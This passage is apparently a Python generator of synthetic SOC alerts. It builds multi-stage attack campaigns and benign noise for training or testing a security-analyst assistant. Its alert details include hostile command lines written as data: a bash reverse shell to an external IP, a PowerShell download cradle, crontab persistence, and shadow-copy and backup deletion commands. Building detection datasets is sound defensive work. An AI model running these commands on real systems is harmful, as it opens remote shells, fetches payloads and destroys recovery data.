#!/usr/bin/env python3
"""
SOC Analyst Copilot — Synthetic alert dataset generator (v2)

Generates realistic multi-stage attack campaigns in the exact Alert schema
the backend expects: { id, time, sev, rule, src, dst, detail, host }

Usage:
    python3 scripts/gen_sample_alerts.py                           # APT campaign (23 alerts)
    python3 scripts/gen_sample_alerts.py --campaign ransomware     # ransomware (14 alerts)
    python3 scripts/gen_sample_alerts.py --campaign insider        # insider threat (10 alerts)
    python3 scripts/gen_sample_alerts.py --count 200               # 200 parametric alerts
    python3 scripts/gen_sample_alerts.py --count 200 --seed 42     # reproducible output
    python3 scripts/gen_sample_alerts.py --count 200 --out ~/alerts.json
    python3 scripts/gen_sample_alerts.py --count 200 --post        # POST to backend
    python3 scripts/gen_sample_alerts.py --list                    # list campaigns
"""

import json
import sys
import argparse
import urllib.request
import urllib.error
import random

# ─────────────────────────────────────────────────────────────────────────────
# Network topology (used by parametric generator)
# ─────────────────────────────────────────────────────────────────────────────
ATTACKER_IPS = [
    "185.220.101.45",   # Tor exit node
    "91.243.44.17",     # Eastern Europe VPS
    "45.33.32.156",     # Shodan scanner
    "103.27.108.28",    # APAC VPS
    "198.51.100.77",    # Documentation-range attacker
    "5.188.86.172",     # Russia-attributed C2
]
DMZ_IPS = ["203.0.113.10", "203.0.113.11", "203.0.113.15"]

HOSTS = {
    "LINUX-WEB-01":    "10.0.1.15",
    "LINUX-WEB-02":    "10.0.1.16",
    "DC01":            "10.0.1.5",
    "DC02":            "10.0.1.6",
    "FILESERVER-01":   "10.0.1.22",
    "FILESERVER-02":   "10.0.1.23",
    "DB-PROD-01":      "10.0.1.35",
    "MAIL-GW-01":      "10.0.1.10",
    "DESKTOP-ACCT-01": "10.0.2.51",
    "DESKTOP-ACCT-02": "10.0.2.52",
    "DESKTOP-ACCT-03": "10.0.2.53",
    "DESKTOP-ENG-01":  "10.0.2.61",
    "DESKTOP-ENG-02":  "10.0.2.62",
    "DESKTOP-FIN-01":  "10.0.2.71",
    "DESKTOP-FIN-02":  "10.0.2.72",
    "DESKTOP-FIN-03":  "10.0.2.73",
    "DESKTOP-HR-01":   "10.0.2.81",
    "SCANNER-01":      "10.0.1.99",
    "BACKUP-01":       "10.0.1.98",
    "JUMPBOX-01":      "10.0.1.50",
}

WORKSTATIONS = ["DESKTOP-ACCT-01","DESKTOP-ACCT-02","DESKTOP-ACCT-03",
                "DESKTOP-ENG-01","DESKTOP-ENG-02",
                "DESKTOP-FIN-01","DESKTOP-FIN-02","DESKTOP-FIN-03","DESKTOP-HR-01"]
SERVERS      = ["LINUX-WEB-01","LINUX-WEB-02","DC01","DC02",
                "FILESERVER-01","FILESERVER-02","DB-PROD-01","MAIL-GW-01"]
ALL_HOSTS    = list(HOSTS.keys())

USERS       = ["jsmith","mdavis","lthompson","agarcia","rwilson",
               "jbrown","deploy","svc_backup","svc_db","admin","klee","pbaker"]
RANSOM_EXTS = ["locked","encrypted","enc","ALPHV","lck","ryk","zepto","wncry"]
C2_DOMAINS  = ["rnd8a2f.exfil-domain.ru","update.evil-cdn.io",
               "svc.malware-c2.net","cdn.bad-pkg.io","gate.darkweb-api.com"]
CLOUD_SVC   = ["Dropbox","Mega.nz","WeTransfer","pCloud","anonfiles.com","GoFile.io"]
MALWARE     = ["svchost32","WmiPreSE","RuntimeBroker2","MicrosoftEdgeCP",
               "svchostt","explorer32","lsasss","msdtc2","spoolsv2"]

# ─────────────────────────────────────────────────────────────────────────────
# Template pool — (rule, sev, [detail variants], src_group, dst_group)
# src/dst groups: "attacker" | "dmz" | "dc" | "fileserver" | "workstation" | "server" | "any"
# ─────────────────────────────────────────────────────────────────────────────
TEMPLATES = [
    # ── Reconnaissance ───────────────────────────────────────────────────────
    ("Nmap Port Scan Detected", "LOW", [
        "SYN scan across 1024 ports in 3s — OS fingerprint matches Nmap 7.94",
        "UDP scan 500 ports — service version probing via -sV flag",
        "Aggressive scan (-A) detected: OS, service, script, traceroute",
        "SYN stealth scan /24 subnet — 14 live hosts discovered",
        "Nmap NSE script scan: ssl-enum-ciphers, http-headers on port 443",
    ], "attacker", "dmz"),

    ("Service Enumeration — Banner Grab", "LOW", [
        "HTTP/SSH/FTP banner grabs on ports 22, 80, 443, 21, 8080",
        "TLS certificate enumeration on 12 hosts — SANs and CN extracted",
        "SSH version disclosure: OpenSSH 7.9 — known CVEs flagged",
        "Web server banner: Apache 2.4.29 — outdated, known vulns",
        "SMTP EHLO/VRFY commands — user enumeration attempt via mail server",
    ], "attacker", "dmz"),

    ("Web Crawler — Directory Discovery", "LOW", [
        "Dirsearch scan: 4,200 requests in 45s — /admin, /backup found",
        "Gobuster: 2,100 requests, discovered /api/v1/users endpoint",
        "wfuzz fuzzing /api/FUZZ — sensitive endpoints exposed",
        "Robots.txt + sitemap.xml harvested — internal paths revealed",
        "WordPress user enumeration via ?author=1..25 — 3 users found",
    ], "attacker", "dmz"),

    ("Directory Traversal Attempt", "MEDIUM", [
        "../../etc/passwd traversal on /api/file?path= — blocked by WAF",
        "Path traversal in upload param: ../../../windows/win.ini",
        "LFI attempt: /api/log?file=../../../../etc/shadow",
        "48 traversal attempts in 30s — automated scanner pattern",
        "Null byte injection: /download?file=../../etc/passwd%00.jpg",
    ], "attacker", "dmz"),

    # ── Initial Access ────────────────────────────────────────────────────────
    ("SSH Brute Force — Low Rate", "MEDIUM", [
        "12 failed SSH attempts in 180s for user 'admin'",
        "Slow brute force: 1 attempt/15s — evading lockout policy",
        "9 failed auth attempts across 3 usernames — admin, root, deploy",
        "Password spray: 8 users tried with 'Welcome1' — 2 accounts hit lockout",
        "15 auth failures for 'svc_backup' from single source IP",
    ], "attacker", "dmz"),

    ("SSH Brute Force — Credential Stuffing", "MEDIUM", [
        "47 failed SSH attempts — usernames from rockyou2024 breach list",
        "Credential stuffing: 120 user:pass pairs from combo list in 90s",
        "Distributed brute force: 8 source IPs, same user list — coordinated",
        "62 auth failures — matching patterns of previous Mirai botnet scans",
        "THC-Hydra pattern: parallel SSH threads, 4 attempts/second",
    ], "attacker", "dmz"),

    ("SSH Login After Brute Force", "HIGH", [
        "Auth success for 'deploy' after 53 failures — password spray hit",
        "Valid credential found: user 'admin' authenticated from 185.220.101.45",
        "First successful login from this IP after 89 attempts",
        "Auth success for 'jsmith' — account not locked (policy gap)",
        "Successful SSH login: user 'svc_db' — service account, unexpected",
    ], "attacker", "dmz"),

    ("Web App SQL Injection", "HIGH", [
        "UNION-based SQLi in /api/login?user= — DB version returned in error",
        "Blind time-based SQLi: sleep(5) in user param — 5s delay confirmed",
        "SQLi in /search?q= — automated scanner (sqlmap User-Agent detected)",
        "Boolean-based blind SQLi: 340 requests, iterating column count",
        "Error-based SQLi: MSSQL xp_cmdshell call attempted — blocked",
    ], "attacker", "dmz"),

    ("Phishing Email — Macro Attachment", "MEDIUM", [
        "'Invoice_Q2.xlsm' macro attachment delivered — auto-exec on open",
        "HTML smuggling payload in email body — JS drops .hta file to %TEMP%",
        ".docm attachment with VBA macro: connects to remote URL on open",
        "ISO file attachment: mounts and auto-runs .lnk shortcut payload",
        "PDF with embedded JavaScript — launches calc.exe (PoC stage)",
    ], "attacker", "MAIL-GW-01"),

    ("VPN Login — Impossible Travel", "HIGH", [
        "User 'jsmith' in London then Moscow — 22 min apart (impossible)",
        "Same account, 2 geos: 185.220.101.45 (Russia) + 10.0.1.50 (VPN)",
        "Credential reuse: account logged in from 3 countries in 4 hours",
        "First-ever login from AS42831 (UK VPS range) for user 'mdavis'",
        "Auth from Tor exit node 185.220.101.45 — corporate VPN policy violation",
    ], "attacker", "dmz"),

    # ── Execution ─────────────────────────────────────────────────────────────
    ("Office Macro — Suspicious Child Process", "HIGH", [
        "EXCEL.EXE spawned cmd.exe → powershell -enc JABXAGkAbgBkAG8A...",
        "WINWORD.EXE launched mshta.exe with remote URL — macro execution",
        "Office app spawned wscript.exe: VBScript dropper executed",
        "PowerPoint slideshow: ppsx file executes embedded OLE object",
        "OneNote .one file: EmbeddedFile attachment auto-runs on click",
    ], "workstation", "workstation"),

    ("PowerShell — Encoded Command Execution", "HIGH", [
        "powershell -enc decoded: IEX(New-Object Net.WebClient).DownloadString",
        "PS: -NoP -NonI -W Hidden -Exec Bypass — AMSI bypass pattern",
        "Reflective DLL injection via PS — shellcode loaded into memory",
        "PS download cradle: (New-Object System.Net.WebClient).DownloadFile",
        "PS: Invoke-Expression with base64 payload — obfuscated execution",
    ], "workstation", "attacker"),

    ("Reverse Shell Established", "CRITICAL", [
        "Outbound TCP/4444 — Metasploit meterpreter signature confirmed",
        "Netcat reverse shell: bash -i >& /dev/tcp/185.220.101.45/9001",
        "Cobalt Strike beacon TCP/8443 — JA3 fingerprint match (Malleable C2)",
        "Python reverse shell one-liner executed on LINUX-WEB-01",
        "PowerShell reverse shell: TCP/4445 to 91.243.44.17 — session open",
    ], "dmz", "attacker"),

    ("Malware Dropper — Executable Written", "CRITICAL", [
        "svchost32.exe (4.2 MB) written to C:\\Users\\jsmith\\AppData\\Local\\Temp",
        "LOLBin: certutil -decode payload.b64 → C:\\Windows\\Temp\\svc.exe",
        "WmiPreSE.exe (2.8 MB) dropped — entropy 7.9, likely packed/encrypted",
        "Dropper via msiexec: MSI installs backdoor to ProgramData\\Microsoft",
        "BITSAdmin transfer: malware downloaded to %APPDATA%\\Roaming\\[exe]",
    ], "workstation", "workstation"),

    ("C2 Beacon — Periodic Callback", "HIGH", [
        "HTTPS beacon every 60s to 91.243.44.17:443 — Cobalt Strike pattern",
        "DNS beacon: 18 TXT queries/min to rnd8a2f.exfil-domain.ru",
        "HTTP checkin to /jquery-3.6.0.min.js — fake CDN path, known C2 IOC",
        "Encrypted traffic TCP/8443 — JA3 fingerprint matches Empire agent",
        "Sliver C2: mTLS beacon to 103.27.108.28:31337 — 30s jitter",
    ], "workstation", "attacker"),

    # ── Persistence ───────────────────────────────────────────────────────────
    ("Scheduled Task — Persistence Mechanism", "MEDIUM", [
        "schtasks /create /tn 'WindowsUpdate3' /sc onlogon /tr 'svchost32.exe'",
        "New AT job: explorer32.exe runs at 08:00 daily — no change ticket",
        "crontab modified: @reboot /tmp/.hidden/svc >/dev/null 2>&1",
        "Task Scheduler: 'MicrosoftEdgeCP' created — disguised malware",
        "Systemd service 'networkd-helper' created — not in baseline",
    ], "workstation", "workstation"),

    ("Registry Run Key Modified", "MEDIUM", [
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run: 'MsUpdate' added",
        "HKLM\\RunOnce: svchost32.exe added by non-admin user jsmith",
        "Registry autorun key: 'WindowsAuth' → C:\\Temp\\lsasss.exe",
        "HKCU\\Run value added outside change window — persistence indicator",
        "Autoruns baseline delta: 2 new HKLM\\Run entries post-compromise",
    ], "workstation", "workstation"),

    ("New Service Created for Persistence", "HIGH", [
        "Service 'WmiPreSE2' created: ImagePath=C:\\Windows\\Temp\\svc.exe",
        "sc create 'WindowsRemoteHelper' binpath= C:\\Temp\\msdtc2.exe start= auto",
        "Service binary in user-writable path — privilege escalation risk",
        "New service 'spoolsv2' — masquerading as print spooler",
        "Service installed via PsExec from remote host — lateral persistence",
    ], "workstation", "dc"),

    ("SSH Authorized Keys Modified", "MEDIUM", [
        "Attacker RSA key appended to /root/.ssh/authorized_keys on LINUX-WEB-01",
        "New SSH key added for 'deploy' — no change request, out of hours",
        "authorized_keys modified: 3 new entries — unknown key fingerprints",
        "/home/jsmith/.ssh/authorized_keys written by root — backdoor key",
        "SSH host key rotated unexpectedly — possible MITM setup",
    ], "server", "server"),

    # ── Discovery ─────────────────────────────────────────────────────────────
    ("Internal Network Scan from Compromised Host", "MEDIUM", [
        "ARP sweep + SYN scan 10.0.1.0/24 — 14 live hosts found in 8s",
        "masscan 10.0.0.0/16 TCP/22,80,443,3389 — worm-like propagation speed",
        "ICMP ping sweep: 254 hosts in 2s — not a legitimate IT task",
        "Internal Nmap from LINUX-WEB-01 — attacker pivoting internally",
        "Host discovery: 10.0.2.0/24 ARP scan — workstation subnet mapped",
    ], "server", "server"),

    ("LDAP Enumeration — Active Directory", "MEDIUM", [
        "Unauthenticated LDAP query: all users + groups + OUs from DC01",
        "BloodHound collection: ACL paths, admin relations, GPO data dumped",
        "LDAP: all computer accounts + OS versions + last-logon exported",
        "ADExplorer snapshot: full AD tree serialised to disk",
        "PowerView Get-DomainUser, Get-DomainGroup — AD recon module",
    ], "server", "dc"),

    ("SMB Share Enumeration", "LOW", [
        "NetShareEnum on FILESERVER-01: Finance, HR, IT, Backup shares found",
        "net view //10.0.1.22 — share listing without valid ticket",
        "SMB null session: share names, IPC$ access — pre-auth enumeration",
        "CrackMapExec spider: 10.0.1.0/24 SMB shares listed in 12s",
        "Smbclient listing all shares on 6 internal hosts — credential reuse",
    ], "server", "fileserver"),

    ("Database Reconnaissance", "MEDIUM", [
        "SELECT table_name FROM information_schema.tables — schema dump attempt",
        "xp_dirtree called on DB-PROD-01 — UNC path injection attempt",
        "MSSQL: sa account login attempt from LINUX-WEB-01 (10.0.1.15)",
        "MySQL: SHOW DATABASES from unauthorised source 10.0.1.15",
        "DB connection from workstation subnet (10.0.2.x) — unusual source",
    ], "server", "server"),

    # ── Lateral Movement ──────────────────────────────────────────────────────
    ("Pass-the-Hash — NTLM Lateral Movement", "HIGH", [
        "SMB auth via NTLM hash for 'svc_backup' — no plaintext credential",
        "Mimikatz sekurlsa::pth used: NTLM hash for domain admin detected",
        "NTLM relay: hash captured from LINUX-WEB-01, replayed to DC01",
        "Overpass-the-Hash: NTLM → Kerberos TGT obtained for 'jbrown'",
        "CrackMapExec PTH: domain\\jsmith hash authenticated on 4 hosts",
    ], "server", "fileserver"),

    ("RDP Login — Unusual Source", "HIGH", [
        "RDP from LINUX-WEB-01 to DESKTOP-FIN-01 — Linux host, atypical",
        "First-ever RDP from 10.0.1.15 to workstation subnet — no ticket",
        "RDP session: non-IT user 'deploy' logged into DESKTOP-ACCT-02",
        "Xfreerdp client: RDP from LINUX-WEB-01, user 'jsmith', new session",
        "RDP login success after 3 failures — credential found via PTH",
    ], "server", "workstation"),

    ("PsExec Remote Code Execution", "HIGH", [
        "PsExec: cmd.exe launched on DESKTOP-FIN-01 from LINUX-WEB-01",
        "PSEXESVC.exe dropped to ADMIN$ — PsExec remote service installed",
        "PsExec session: whoami /all, ipconfig /all — post-compromise recon",
        "Remote service via PsExec: payload executed as SYSTEM on target",
        "PsExec /accepteula /s flag — running as SYSTEM, no UAC prompt",
    ], "server", "workstation"),

    ("WMI Lateral Movement", "HIGH", [
        "wmic /node:DESKTOP-FIN-02 process call create 'svchost32.exe'",
        "WMI subscription created: payload fires on user logon",
        "Win32_Process.Create via WMI from DC01 to workstation subnet",
        "Impacket wmiexec.py pattern: WMI shell on DESKTOP-ACCT-03",
        "DCOM lateral movement: MMC20.Application ExecuteShellCommand called",
    ], "workstation", "workstation"),

    ("Token Impersonation / Privilege Escalation", "HIGH", [
        "SeImpersonatePrivilege abused — PrintSpoofer potato escalation",
        "Token theft: SYSTEM token duplicated by user 'jsmith' process",
        "JuicyPotato: CLSID exploit → SYSTEM shell on DESKTOP-ACCT-01",
        "Named pipe impersonation: SYSTEM token obtained via spoolsv abuse",
        "SweetPotato: COM server impersonation → SYSTEM privilege obtained",
    ], "workstation", "workstation"),

    # ── Privilege Escalation ──────────────────────────────────────────────────
    ("Kerberoasting Attack Detected", "CRITICAL", [
        "TGS requests for 6 SPNs in 2s — Rubeus /kerberoast pattern",
        "GetUserSPNs.py: 4 service tickets requested (Impacket) — offline crack",
        "Kerberos TGS-REP: 'MSSQLSvc/db-prod-01:1433' — RC4 downgrade",
        "Kerberoast: SPNs for svc_backup, svc_db, HTTP/sharepoint requested",
        "Automated Kerberoasting: 8 TGS-REPs in 3s — cracking follows",
    ], "server", "dc"),

    ("AS-REP Roasting", "HIGH", [
        "AS-REP for 'jbrown': pre-auth not required — hash offline-crackable",
        "GetNPUsers.py: 2 accounts without Kerberos pre-auth found",
        "Rubeus asreproast: TGT hash for svc_backup captured without creds",
        "AS-REP roasting: accounts with DONT_REQ_PREAUTH enumerated",
        "4 AS-REP hashes captured — hashcat -m 18200 attack likely",
    ], "server", "dc"),

    ("DCSync — Domain Replication Abuse", "CRITICAL", [
        "MS-DRSR replication from non-DC LINUX-WEB-01 — mimikatz dcsync",
        "IDL_DRSGetNCChanges from 10.0.1.15 — krbtgt hash at risk",
        "Domain sync: NTLM hash for Administrator account replicated",
        "DCSync: all domain hashes replicated by non-DC host — full dump",
        "Impacket secretsdump.py: AD credential dump via DRSUAPI",
    ], "server", "dc"),

    ("LSASS Memory Dump", "CRITICAL", [
        "ProcDump64.exe targeting lsass.exe — AV alert triggered",
        "MiniDumpWriteDump call on lsass.exe — credential theft pattern",
        "lsass.dmp (40 MB) created in C:\\Windows\\Temp — offline parsing",
        "Task Manager: lsass.exe Create dump file — manual credential dump",
        "Mimikatz sekurlsa::logonpasswords: 8 plaintext creds extracted",
    ], "workstation", "workstation"),

    ("UAC Bypass", "HIGH", [
        "fodhelper.exe UAC bypass — HKCU registry hijack technique",
        "eventvwr.exe MSC file hijack — elevated cmd obtained silently",
        "computerdefaults.exe auto-elevate abuse — no UAC prompt shown",
        "Cmstp.exe UAC bypass: INF file auto-elevates on Windows 10",
        "DiskCleanup scheduled task hijack — SYSTEM execution without UAC",
    ], "workstation", "workstation"),

    # ── Collection ────────────────────────────────────────────────────────────
    ("Sensitive File Access — Bulk Read", "HIGH", [
        "1,847 files read from \\\\FILESERVER-01\\Finance in 3 min",
        "Mass access to IP/R&D share: 920 files in 90s — bulk enumeration",
        "2,400 .docx/.xlsx opened from \\\\FILESERVER-02\\Confidential",
        "HR data bulk read: 640 employee records accessed in 4 minutes",
        "SharePoint mass download: 800 files from /sites/Legal in 5 min",
    ], "fileserver", "fileserver"),

    ("Data Archive Creation — Staging", "HIGH", [
        "7z.exe created data.7z (2.3 GB) — password-protected archive",
        "tar -czf /tmp/.data.tar.gz /home/deploy/configs (1.8 GB)",
        "RAR archive staged: C:\\Users\\Public\\backup.rar (3.1 GB)",
        "PowerShell Compress-Archive: output.zip (870 MB) — unusual size",
        "zip -r -e /tmp/exfil.zip /var/www/html/config — staging for exfil",
    ], "workstation", "workstation"),

    ("Credential Harvesting — Web Browser", "MEDIUM", [
        "SharpChrome: Chrome login data file copied — 34 saved passwords",
        "LaZagne browser module: Firefox/Chrome password DBs dumped",
        "Chromium SQLite login DB read by non-browser process",
        "Windows Credential Manager queried: 12 stored credentials read",
        "Browser history + cookies exported to %TEMP% — recon + creds",
    ], "workstation", "workstation"),

    ("Clipboard and Keylogger Activity", "MEDIUM", [
        "GetClipboardData called 140 times in 60s — clipboard monitor",
        "SetWindowsHookEx(WH_KEYBOARD_LL): global keylogger installed",
        "Clipboard content written to %TEMP%\\kl_dump.txt every 30s",
        "Keylogger output: C:\\ProgramData\\log.dat (48 KB) — credentials",
        "Screenshot capture: 12 desktop bitmaps per minute saved to disk",
    ], "workstation", "workstation"),

    # ── Exfiltration ──────────────────────────────────────────────────────────
    ("Large Outbound Transfer — Unusual Destination", "CRITICAL", [
        "2.1 GB egress to 91.243.44.17:443 over 8 min — no approved cloud sync",
        "Bulk upload: 880 MB/min sustained for 6 min to unknown IP",
        "Egress spike: 3.4 GB in 12 min (daily avg: 120 MB) — anomaly",
        "FTP exfil: 1.7 GB to 185.220.101.45:21 — cleartext transfer",
        "SCP from LINUX-WEB-01 to 103.27.108.28 — 2.8 GB in 9 min",
    ], "workstation", "attacker"),

    ("DNS Tunneling — C2 Communication", "CRITICAL", [
        "High-entropy TXT queries to rnd8a2f.exfil-domain.ru — iodine/dnscat2",
        "18 DNS requests/min to cdn.bad-pkg.io — data in subdomain labels",
        "Base64 encoded data in DNS A queries — manual exfil via DNS",
        "dnscat2 client pattern: long TXT query subdomains, 12 req/min",
        "DNS exfil: 640 MB data chunked into TXT record queries over 2h",
    ], "server", "attacker"),

    ("Cloud Upload — Unapproved Service", "HIGH", [
        "840 MB uploaded to Mega.nz from DESKTOP-FIN-01 — DLP alert",
        "WeTransfer: 12 files (1.2 GB) uploaded — not on approved app list",
        "Dropbox API: bulk upload via rclone from DESKTOP-FIN-02",
        "GoFile.io upload: 680 MB from workstation — first-ever use",
        "pCloud WebDAV: sustained 50 MB/min upload — data exfil pattern",
    ], "workstation", "attacker"),

    ("HTTPS Egress — Non-Standard Port", "HIGH", [
        "TLS 1.3 on TCP/8443 — JA3 fingerprint matches Cobalt Strike beacon",
        "HTTPS on TCP/9001 to 5.188.86.172 — not in firewall allowlist",
        "Encrypted traffic TCP/4445 — Sliver/Empire C2 pattern",
        "TLS on TCP/31337 — elite port, manual C2 configuration",
        "HTTPS POST to /api/submit on TCP/8080 — data exfil via web",
    ], "server", "attacker"),

    # ── Ransomware specific ───────────────────────────────────────────────────
    ("Shadow Copy Deletion — Anti-Recovery", "CRITICAL", [
        "vssadmin delete shadows /all /quiet — pre-encryption anti-recovery",
        "wmic shadowcopy delete — ransomware backup destruction",
        "bcdedit /set {default} recoveryenabled No — boot recovery disabled",
        "wbadmin delete catalog -quiet — Windows backup catalogue removed",
        "Disable-ComputerRestore + vssadmin delete — full recovery prevention",
    ], "workstation", "workstation"),

    ("Mass File Encryption — Ransomware", "CRITICAL", [
        "3,200 files renamed to .locked extension in 90s — encrypting",
        "Ransomware: 480 .docx/.xlsx encrypted per second on DESKTOP-ACCT-02",
        "File mass-rename: .enc extension — LockBit 3.0 pattern confirmed",
        "2,800 files on network share renamed .ALPHV — SMB propagation",
        "AES-256 encryption in progress: 8,400 files modified in 3 min",
    ], "workstation", "workstation"),

    ("Ransomware Network Propagation", "CRITICAL", [
        "SMB MS17-010 probe against 10.0.2.0/24 — EternalBlue spread",
        "Worm loop: each encrypted host scans /24 for new targets",
        "WMI propagation: ransomware self-copies to 6 hosts in 90s",
        "PsExec self-replication: PSEXESVC drops payload on new hosts",
        "ADMIN$ share used to propagate to 8 workstations in 4 min",
    ], "workstation", "workstation"),

    ("Ransom Note Dropped", "HIGH", [
        "README_DECRYPT.txt written to Desktop, Documents, Downloads",
        "HOW_TO_DECRYPT.html placed in 240 directories — LockBit format",
        "!DECRYPT.txt in every encrypted folder — ALPHV/BlackCat note",
        "Ransom note desktop wallpaper changed — BMP written to %APPDATA%",
        "RECOVER_FILES.txt: 72h deadline, Tor onion address for payment",
    ], "workstation", "workstation"),

    # ── Noise / False Positives ───────────────────────────────────────────────
    ("Vulnerability Scanner — Scheduled Scan", "LOW", [
        "Nessus scan from approved SCANNER-01 — change ticket INC-2048",
        "Qualys agent scan: SCANNER-01 → 10.0.0.0/16 — maintenance window",
        "OpenVAS scan authorised by IT — ticket CR-1902",
        "Tenable.io connector scan — scheduled weekly compliance check",
        "SCANNER-01 internal scan — pre-approved change window 02:00–06:00",
    ], "SCANNER-01", "SCANNER-01"),

    ("Cloud Storage Sync — Approved Tool", "LOW", [
        "OneDrive sync uploading 340 MB to Microsoft 365 — expected",
        "SharePoint sync: 820 files from DESKTOP-HR-01 — normal backup",
        "Dropbox Business client: 120 MB sync from approved business account",
        "Google Drive sync agent — DESKTOP-ENG-01, IT-approved install",
        "Box sync: 240 MB corporate account — policy compliant",
    ], "workstation", "workstation"),

    ("Admin Share Access — Domain Routine", "LOW", [
        "DC01 accessed ADMIN$ on FILESERVER-01 — domain admin, expected",
        "Group Policy update via SYSVOL from DC01 to all workstations",
        "IT maintenance: JUMPBOX-01 C$ access — change ticket CHG-0441",
        "SCCM agent push: ADMIN$ access from management server — routine",
        "WinRM from JUMPBOX-01 to DC02 — IT management, approved source",
    ], "dc", "fileserver"),

    ("PowerShell — Signed Management Script", "LOW", [
        "Signed DSC script from DC01 — Group Policy baseline enforcement",
        "Windows Update PS module: Get-WindowsUpdate run (signed script)",
        "PS remoting from JUMPBOX-01 — IT maintenance, approved",
        "Invoke-Pester test suite — CI/CD pipeline, signed script",
        "Import-Module ActiveDirectory — IT admin task, expected",
    ], "dc", "workstation"),

    ("Backup Job — Scheduled", "LOW", [
        "Veeam nightly: 18 GB to Azure Backup vault — scheduled 23:00",
        "SQL Server backup: 4.2 GB .bak file — nightly job, BACKUP-01",
        "BACKUP-01 writing to \\\\FILESERVER-01\\Backup — scheduled task",
        "rsync to offsite NAS: 12 GB incremental — DR policy",
        "Backup agent: 28 GB full backup to cloud — weekly schedule",
    ], "BACKUP-01", "BACKUP-01"),

    ("AV / EDR Update — Routine", "LOW", [
        "Defender definitions updated: 1.381.2140.0 — 3.2 MB download",
        "CrowdStrike Falcon sensor update deployed — version 6.58",
        "AV signature database: 142 new signatures added — daily update",
        "Carbon Black agent update: 120 MB package — IT push",
        "SentinelOne policy update applied to 24 endpoints",
    ], "workstation", "workstation"),

    ("DNS Query — First-Seen Domain", "LOW", [
        "First-seen query: api.github.com — dev workstation, likely legit",
        "New CDN domain resolved: cdn.jsdelivr.net — SaaS eval",
        "NX domain query: typo correction — developer testing localhost",
        "analytics.newrelic.com first seen — new monitoring agent install",
        "First query to update.code.visualstudio.com — VS Code update",
    ], "workstation", "workstation"),

    ("Web Traffic — Legitimate Bot", "LOW", [
        "Googlebot crawling /sitemap.xml — verified via PTR record",
        "StatusCake monitor: /health endpoint ping every 30s — expected",
        "UptimeRobot check: TCP/443 probe — approved monitoring service",
        "Pingdom synthetic test: /api/health — SLA monitoring",
        "Bing crawler: verified User-Agent and PTR match — benign",
    ], "attacker", "dmz"),
]

# Group templates by attack phase for chain construction
PHASE_MAP = {
    "recon":       [0, 1, 2, 3],
    "initial":     [4, 5, 6, 7, 8, 9],
    "execution":   [10, 11, 12, 13, 14],
    "persistence": [15, 16, 17, 18],
    "discovery":   [19, 20, 21, 22],
    "lateral":     [23, 24, 25, 26, 27],
    "privesc":     [28, 29, 30, 31, 32],
    "collection":  [33, 34, 35, 36],
    "exfil":       [37, 38, 39, 40],
    "ransomware":  [41, 42, 43, 44],
    "noise":       [45, 46, 47, 48, 49, 50, 51, 52],
}

# Attack chain definitions: list of phases in order
CHAIN_DEFS = [
    ["recon", "initial", "execution", "persistence", "discovery", "lateral", "privesc", "collection", "exfil"],
    ["initial", "execution", "lateral", "privesc", "collection", "exfil"],
    ["recon", "initial", "execution", "ransomware"],
    ["initial", "execution", "discovery", "lateral", "collection", "exfil"],
    ["recon", "initial", "discovery", "collection", "exfil"],
]


def _pick_ip(group: str, rng: random.Random, context: dict) -> str:
    if group == "attacker":   return context.get("attacker", rng.choice(ATTACKER_IPS))
    if group == "dmz":        return rng.choice(DMZ_IPS)
    if group == "dc":         return HOSTS.get("DC01", "10.0.1.5")
    if group == "fileserver": return HOSTS.get("FILESERVER-01", "10.0.1.22")
    if group == "workstation":
        h = context.get("pivot", rng.choice(WORKSTATIONS))
        return HOSTS.get(h, "10.0.2.51")
    if group == "server":
        h = context.get("entry", rng.choice(SERVERS))
        return HOSTS.get(h, "10.0.1.15")
    if h := HOSTS.get(group):
        return h
    return rng.choice(list(HOSTS.values()))


def _pick_host(group: str, rng: random.Random, context: dict) -> str:
    if group == "attacker":   return context.get("entry", rng.choice(SERVERS))
    if group == "dmz":        return context.get("entry", rng.choice(SERVERS))
    if group == "dc":         return "DC01"
    if group == "fileserver": return "FILESERVER-01"
    if group == "workstation":return context.get("pivot", rng.choice(WORKSTATIONS))
    if group == "server":     return context.get("entry", rng.choice(SERVERS))
    if group in HOSTS:        return group
    return rng.choice(ALL_HOSTS)


def _ts(seconds_from_start: int) -> str:
    total = 8 * 3600 + seconds_from_start
    h, rem = divmod(total, 3600)
    m, s = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"


def generate_alerts(count: int, seed: int) -> list[dict]:
    rng = random.Random(seed)
    events = []  # list of (seconds, rule, sev, detail, src, dst, host)

    # Build attack chains
    num_chains = min(5, max(2, count // 30))
    for ci in range(num_chains):
        chain_def = CHAIN_DEFS[ci % len(CHAIN_DEFS)]
        start_offset = ci * rng.randint(600, 2400)  # chains stagger by 10-40 min
        t = start_offset
        attacker = rng.choice(ATTACKER_IPS)
        entry    = rng.choice(SERVERS)
        pivot    = rng.choice(WORKSTATIONS)
        ctx = {"attacker": attacker, "entry": entry, "pivot": pivot}

        for phase in chain_def:
            idxs = PHASE_MAP.get(phase, [])
            if not idxs:
                continue
            alerts_in_phase = rng.randint(2, 5)
            for _ in range(alerts_in_phase):
                ti = rng.choice(idxs)
                if ti >= len(TEMPLATES):
                    continue
                rule, sev, details, src_g, dst_g = TEMPLATES[ti]
                detail = rng.choice(details)
                src    = _pick_ip(src_g, rng, ctx)
                dst    = _pick_ip(dst_g, rng, ctx)
                host   = _pick_host(dst_g, rng, ctx)
                events.append((t, rule, sev, detail, src, dst, host))
                t += rng.randint(30, 480)  # 30s – 8min between events

    # Fill remaining slots with noise
    noise_needed = max(0, count - len(events))
    noise_idxs   = PHASE_MAP["noise"]
    for _ in range(noise_needed + 20):
        t     = rng.randint(0, 28800)
        ti    = rng.choice(noise_idxs)
        if ti >= len(TEMPLATES):
            continue
        rule, sev, details, src_g, dst_g = TEMPLATES[ti]
        ctx   = {"attacker": rng.choice(ATTACKER_IPS),
                 "entry": rng.choice(SERVERS),
                 "pivot": rng.choice(WORKSTATIONS)}
        detail = rng.choice(details)
        src    = _pick_ip(src_g, rng, ctx)
        dst    = _pick_ip(dst_g, rng, ctx)
        host   = _pick_host(dst_g, rng, ctx)
        events.append((t, rule, sev, detail, src, dst, host))

    # Sort by timestamp, deduplicate by rule+host per 60s window, take count
    events.sort(key=lambda e: e[0])
    seen   = {}
    result = []
    for (t, rule, sev, detail, src, dst, host) in events:
        bucket = (rule, host, t // 60)
        if bucket in seen:
            continue
        seen[bucket] = True
        result.append({
            "id":     f"ALT-{len(result)+1:04d}",
            "time":   _ts(t),
